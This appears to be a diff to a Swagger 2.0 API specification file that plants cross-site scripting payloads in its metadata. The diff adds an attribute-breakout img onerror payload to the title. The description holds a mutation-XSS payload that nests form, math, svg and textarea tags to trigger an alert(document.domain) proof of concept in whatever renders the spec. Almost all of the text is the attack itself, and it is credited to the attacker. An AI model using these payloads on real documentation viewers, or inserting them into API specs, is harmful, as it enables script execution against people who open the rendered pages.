@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY khalidou_kh
+  title: XSS Attack BY khalidou_kh"><img onerror=alert(document.domain) src=1>
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
   version: production
